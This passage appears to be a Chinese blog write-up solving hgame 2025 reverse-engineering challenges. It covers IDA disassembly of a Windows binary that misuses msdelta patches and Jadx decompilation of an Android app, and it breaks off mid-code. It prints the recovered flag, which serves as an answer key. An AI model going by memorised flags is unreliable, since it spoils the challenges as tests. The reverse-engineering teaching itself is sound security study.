<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>000000014000134B <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000134B</span><br><span class="line"><span class="symbol">.text:</span>000000014000134B loc_14000134B:                          <span class="comment">; DATA XREF: .rdata:0000000140003A2C↓o</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000134B <span class="comment">;   __except(1) // owned by 1400012C0</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000134B                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, aSevenEatsTheHa <span class="comment">; &quot;Seven eats the hash and causes the prog&quot;...</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001352</span>                 <span class="keyword">call</span>    <span class="built_in">cs</span>:puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001358</span>                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, aSevenWantsToMa <span class="comment">; &quot;Seven wants to make up for the mistake,&quot;...</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000135F                 <span class="keyword">call</span>    <span class="built_in">cs</span>:puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001365</span>                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, aInputYourMd5 <span class="comment">; &quot;input your MD5:&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000136C                 <span class="keyword">call</span>    printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001371</span>                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, [<span class="built_in">rsp</span>+<span class="number">158h</span>+Buffer]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001379</span>                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, a32s       <span class="comment">; &quot;%32s&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001380</span>                 <span class="keyword">call</span>    scanf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001385</span>                 <span class="keyword">lea</span>     <span class="built_in">rbx</span>, [<span class="built_in">rsp</span>+<span class="number">158h</span>+Buffer]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000014000138D</span>                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, unk_1400050B4</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001394</span>                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001399</span>                 <span class="keyword">nop</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">00000000h</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400013A0</span><br><span class="line"><span class="symbol">.text:</span>00000001400013A0 loc_1400013A0:                          <span class="comment">; CODE XREF: main+27D↓j</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013A0                 <span class="keyword">mov</span>     <span class="built_in">r8</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013A3                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, a02x       <span class="comment">; &quot;%02x&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013AA                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rbx</span>        <span class="comment">; Buffer</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013AD                 <span class="keyword">call</span>    sub_1400010E0</span><br><span class="line"><span class="symbol">.text:</span>00000001400013B2                 <span class="keyword">inc</span>     <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013B5                 <span class="keyword">add</span>     <span class="built_in">rbx</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013B9                 <span class="keyword">sub</span>     <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013BD                 <span class="keyword">jnz</span>     short loc_1400013A0</span><br><span class="line"><span class="symbol">.text:</span>00000001400013BF                 <span class="keyword">mov</span>     <span class="built_in">cs</span>:word_1400050C4, <span class="number">7A01h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013C8                 <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_138]</span><br><span class="line"><span class="symbol">.text:</span>00000001400013CD                 <span class="keyword">movaps</span>  [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_E8], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013D2                 <span class="keyword">movsd</span>   <span class="built_in">xmm1</span>, [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_128]</span><br><span class="line"><span class="symbol">.text:</span>00000001400013D8                 <span class="keyword">movsd</span>   [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_D8], <span class="built_in">xmm1</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013E1                 <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_120]</span><br><span class="line"><span class="symbol">.text:</span>00000001400013E6                 <span class="keyword">movaps</span>  [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_108], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013EB                 <span class="keyword">movsd</span>   <span class="built_in">xmm1</span>, [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_110]</span><br><span class="line"><span class="symbol">.text:</span>00000001400013F1                 <span class="keyword">movsd</span>   [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_F8], <span class="built_in">xmm1</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400013F7                 <span class="keyword">lea</span>     <span class="built_in">r9</span>, qword_140005190</span><br><span class="line"><span class="symbol">.text:</span>00000001400013FE                 <span class="keyword">lea</span>     <span class="built_in">r8</span>, [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_E8]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001403</span>                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, [<span class="built_in">rsp</span>+<span class="number">158h</span>+var_108]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001408</span>                 <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000140A                 <span class="keyword">call</span>    <span class="built_in">cs</span>:ApplyDeltaB</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001410</span>                 <span class="keyword">test</span>    <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001413</span>                 <span class="keyword">jz</span>      short loc_140001479</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001415</span>                 <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001417</span>                 <span class="keyword">xor</span>     <span class="built_in">r8d</span>, <span class="built_in">r8d</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000141A                 <span class="keyword">mov</span>     <span class="built_in">r9</span>, <span class="built_in">cs</span>:qword_140005198</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001421</span>                 <span class="keyword">mov</span>     <span class="built_in">r10</span>, <span class="built_in">cs</span>:qword_140005190</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001428</span>                 <span class="keyword">nop</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>+<span class="number">00000000h</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001430</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001430</span> loc_140001430:                          <span class="comment">; CODE XREF: main+31A↓j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001430</span>                 <span class="keyword">movsxd</span>  <span class="built_in">rax</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001433</span>                 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001435</span>                 <span class="keyword">div</span>     <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001438</span>                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdx</span>+<span class="built_in">r10</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000014000143D</span>                 <span class="keyword">xor</span>     <span class="built_in">al</span>, [<span class="built_in">rsp</span>+<span class="built_in">r8</span>+<span class="number">158h</span>+Str1]		//异或</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001445</span>                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, unk_140003438			//flag密文</span><br><span class="line"><span class="symbol">.text:</span>000000014000144C                 <span class="keyword">cmp</span>     [<span class="built_in">r8</span>+<span class="built_in">rdx</span>], <span class="built_in">al</span>				//比较</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001450</span>                 <span class="keyword">jnz</span>     short loc_14000145E</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001452</span>                 <span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001454</span>                 <span class="keyword">inc</span>     <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001457</span>                 <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">2Bh</span> <span class="comment">; &#x27;+&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000145A                 <span class="keyword">jl</span>      short loc_140001430</span><br><span class="line"><span class="symbol">.text:</span>000000014000145C                 <span class="keyword">jmp</span>     short loc_140001494</span><br><span class="line"><span class="symbol">.text:</span>000000014000145E <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000145E</span><br><span class="line"><span class="symbol">.text:</span>000000014000145E loc_14000145E:                          <span class="comment">; CODE XREF: main+310↑j</span></span><br><span class="line"><span class="symbol">.text:</span>000000014000145E                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, aFlagIsError <span class="comment">; &quot;Flag is error!!&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001465</span>                 <span class="keyword">call</span>    <span class="built_in">cs</span>:puts</span><br><span class="line"><span class="symbol">.text:</span>000000014000146B                 <span class="keyword">call</span>    sub_1400014E0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001470</span>                 <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span>        <span class="comment">; Code</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001472</span>                 <span class="keyword">call</span>    <span class="built_in">cs</span>:__imp_exit</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001472</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001478</span>                 <span class="built_in">db</span> <span class="number">0CCh</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001479</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001479</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001479</span> loc_140001479:                          <span class="comment">; CODE XREF: main+2D3↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001479</span>                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, aYouDidnTTakeAd <span class="comment">; &quot;You didn&#x27;t take advantage of this oppor&quot;...</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001480</span>                 <span class="keyword">call</span>    <span class="built_in">cs</span>:puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140001486</span>                 <span class="keyword">call</span>    sub_1400014E0</span><br><span class="line"><span class="symbol">.text:</span>000000014000148B                 <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span>        <span class="comment">; Code</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000014000148D</span>                 <span class="keyword">call</span>    <span class="built_in">cs</span>:__imp_exit</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000014000148D</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>推导出整个流程为：先加载msdelta.dll，然后提示输入43位的flag，只有flag符合格式要求才继续执行，否则直接输出great，继续执行时会调用<code>ApplyDeltaB</code>这个函数，然后一定会调用不成功，进入异常处理部分，要求输入一个md5，输入后如果能够让ApplyDeltaB成功执行则比较flag（<code>unk_140003438</code>，<font color=lime><strong>[0x3B, 0x02, 0x17, 0x08, 0x0B, 0x5B, 0x4A, 0x52, 0x4D, 0x11, 0x11, 0x4B, 0x5C, 0x43, 0x0A, 0x13, 0x54, 0x12, 0x46, 0x44, 0x53, 0x59, 0x41, 0x11, 0x0C, 0x18, 0x17, 0x37, 0x30, 0x48, 0x15, 0x07, 0x5A, 0x46, 0x15, 0x54, 0x1B, 0x10, 0x43, 0x40, 0x5F, 0x45, 0x5A]</strong></font>），否则输出“你没有抓住机会”，动态调试发现第一次尝试ApplyDeltaB时在其中的ApplyDeltaA引发错误，将IDA报错机制改为日志输出，不暂停程序并默认程序继续执行，可以跳出其他dll的处理部分，进入main的异常处理部分，检测到错误信号为0xD（无效补丁），解析msdelta.dll的pdb，可能是ApplyDeltaA的ApplyFlags、InputBuffer（源于source）或Delta被传入了错误的值，分析并动态调试第一次调用，可以注意到传入的ApplyFlags为0，Source为36字节的输入值，Delta为一个69字节的数据块：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x0B</span>, <span class="number">0xD0</span>, <span class="number">0x45</span>, <span class="number">0x74</span>, <span class="number">0x6C</span>, <span class="number">0xDB</span>, <span class="number">0x01</span>, <span class="number">0x18</span>, <span class="number">0x23</span>, <span class="number">0xC8</span>, <span class="number">0x81</span>, <span class="number">0x03</span>, <span class="number">0x80</span>, <span class="number">0x42</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x53</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="comment">#Seveneatsthehash</span></span><br><span class="line"><span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0xB5</span>, <span class="number">0x5E</span>, <span class="number">0x73</span>, <span class="number">0x7A</span>, <span class="number">0x8D</span>, <span class="number">0xF1</span>, <span class="number">0x30</span>, <span class="number">0xAD</span>, <span class="number">0xD3</span>, <span class="number">0xA2</span>, <span class="number">0x69</span>, <span class="number">0x1E</span>, <span class="number">0x16</span>, <span class="number">0x8D</span>, <span class="number">0x9B</span>, <span class="number">0xE5</span>, <span class="number">0x6F</span>, <span class="number">0x4A</span>, <span class="number">0x2F</span>, <span class="number">0x0F</span>, <span class="number">0x53</span>, <span class="number">0x06</span>, <span class="number">0xF5</span>, <span class="number">0x1B</span>, <span class="number">0x30</span>, <span class="number">0xC3</span>, <span class="number">0x73</span>, <span class="number">0x16</span>, <span class="number">0x0D</span>]</span><br></pre></td></tr></table></figure>
<p>，结合下文要求输入md5，推测就是这16个字节导致了ApplyDelta报错，而新输入的md5则会覆盖掉这一部分，如果覆盖之后能正常执行就进入比较flag阶段，查询msdelta的补丁结构（<a target="_blank" rel="noopener" href="https://1k0ct.github.io/2024/04/29/Windows%E5%B7%AE%E5%BC%82%E5%8C%96%E8%A1%A5%E4%B8%81MSDelta%E4%B9%8B%E7%A0%94%E7%A9%B6/">链接1</a>，<a target="_blank" rel="noopener" href="https://github.com/smilingthax/msdelta-pa30-format/blob/main/README.md">链接2</a>），应用脚本得到如下补丁信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] FileTypeSet     : <span class="number">0x1</span></span><br><span class="line">[+] FileType        : <span class="number">0x1</span></span><br><span class="line">[+] Flags           : <span class="number">0x0</span></span><br><span class="line">[+] TargetSize      : <span class="number">0x1C</span></span><br><span class="line">[+] TargetFileTime  : Wed Jan <span class="number">22</span> <span class="number">02</span>:<span class="number">20</span>:<span class="number">58</span> <span class="number">2025</span></span><br><span class="line">[+] TargetHashAlgId : <span class="number">0x8003</span> <span class="comment">//md5</span></span><br><span class="line">[+] TargetHash      : <span class="number">536576656E6561747374686568617368</span> <span class="comment">//被篡改的哈希值</span></span><br></pre></td></tr></table></figure>
<p>在动态调试到ApplyDeltaA时反编译，注意到其中有一个函数<code>compo::PullcapiContext::GetHash(v6, &amp;a2-&gt;TargetHash);</code>，就是获取目标哈希（补丁中的哈希）的函数，在其执行结束后查看返回值v22，可以得到和上面脚本一样的信息，提示输入md5后再次断在这里可以发现targethash被改成了输入值，即证明这里输入哈希确实是为了能让ApplyDelta正常执行，在其中目标哈希的位置下断点，运行直到触发断点，却发现哈希值还没有经过任何读取比较就已经被覆盖了，失去头绪，回头观察main中的flag比较过程，推测只有一个简单的异或，补丁打在输入的flag上，经过异或后和密文进行比较，动态调试过程中观察到一个可疑的字符串<font color=red><strong>“Seven says you’re right!!!!,0”</strong></font>：<br><img src="/pictures/hgame25_delta.png" title="delta"><br>直接拿密文异或这个字符串，得到flag：<font color=deepskyblue><strong>hgame{934b1236-a124-4150-967c-cb4ff5bcc900}</strong></font>.</p>
<h3 id="尊嘟假嘟："><a href="#尊嘟假嘟：" class="headerlink" title="尊嘟假嘟："></a>尊嘟假嘟：</h3><p>Jadx反编译，先查看zundu和jiadu类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onViewCreated</span><span class="params">(View view, Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onViewCreated(view, savedInstanceState);</span><br><span class="line">        <span class="type">ImageView</span> <span class="variable">JiaDu</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.jiaduimage;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Bundle</span> <span class="variable">bundle</span> <span class="operator">=</span> getArguments();</span><br><span class="line">        JiaDu.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.nobody.zunjia.jiadu.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                String ZunduJiadu;</span><br><span class="line">                <span class="type">String</span> <span class="variable">ZunduJiadu2</span> <span class="operator">=</span> bundle.getString(<span class="string">&quot;zunjia&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (ZunduJiadu2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    ZunduJiadu = <span class="string">&quot;o.0&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ZunduJiadu2.length() &lt; <span class="number">36</span>) &#123;</span><br><span class="line">                    ZunduJiadu = ZunduJiadu2 + <span class="string">&quot;o.0&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ZunduJiadu = <span class="string">&quot;The length is too large&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                bundle.putString(<span class="string">&quot;zunjia&quot;</span>, ZunduJiadu);</span><br><span class="line">                <span class="type">toast</span> <span class="variable">to</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">toast</span>(jiadu.<span class="built_in">this</span>.getContext());</span><br><span class="line">                to.setText(ZunduJiadu);</span><br><span class="line">                to.setDuration(<span class="number">0</span>);</span><br><span class="line">                to.show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">this</span>.binding.buttonSecond.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.nobody.zunjia.jiadu$$ExternalSyntheticLambda0</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view2)</span> &#123;</span><br><span class="line">                jiadu.<span class="built_in">this</span>.m204lambda$onViewCreated$<span class="number">0</span>$comnobodyzunjiajiadu(bundle, view2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>结合实际运行发现是一个切换“尊嘟”（0.o）与“假嘟”（o.0）的页面，点击图片会弹出toast消息，会从零开始不断将“0.o”与“o.0”填入一个字符串，当这个字符串长度大于等于36时（即输入次数大于12）再次点击图片会将字符串替换成The length is too large，但由于还是小于36长度所以可以继续向后再追加4次点击，再观察toast类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nobody.zunjia;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">toast</span> <span class="keyword">extends</span> <span class="title class_">Toast</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Context mycontext;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">check</span><span class="params">(Context context, String str)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">toast</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context);</span><br><span class="line">        <span class="built_in">this</span>.mycontext = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.widget.Toast</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setText</span><span class="params">(CharSequence s)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.setText(s);</span><br><span class="line">        check(<span class="built_in">this</span>.mycontext, (String) DexCall.callDexMethod(<span class="built_in">this</span>.mycontext, <span class="built_in">this</span>.mycontext.getString(C0822R.string.dex), <span class="built_in">this</span>.mycontext.getString(C0822R.string.classname), <span class="built_in">this</span>.mycontext.getString(C0822R.string.func1), s));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现所给的toast是经过改动的，字符串并不仅仅是显示在屏幕上，而是先传给了<br><code>Dexcall</code>类，结合反编译的values中的string.txt可以得到func1是encode，则字符串会以某种方式编码，之后进行check，查看来源于DexCall类中加载的libcheck.so，观察libcheck.so中的sub_1100（check）函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1100</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-D8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+40h] [rbp-D0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-C8h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+50h] [rbp-C0h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+58h] [rbp-B8h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+60h] [rbp-B0h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+70h] [rbp-A0h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+78h] [rbp-98h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+80h] [rbp-90h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+CFh] [rbp-41h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">48</span>]; <span class="comment">// [rsp+D0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+100h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v18 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v14 = sub_1360(a1, a4, (__int64)&amp;v16);</span><br><span class="line">  v13 = sub_1090(a1, (__int64)<span class="string">&quot;com/nobody/zunjia/DexCall&quot;</span>);</span><br><span class="line">  v12 = sub_13A0(a1, v13, (__int64)<span class="string">&quot;&lt;init&gt;&quot;</span>, (__int64)<span class="string">&quot;()V&quot;</span>);</span><br><span class="line">  sub_13E0(a1, v13, v12);</span><br><span class="line">  v11 = sub_14D0(a1,v13,<span class="string">&quot;callDexMethod&quot;</span>,<span 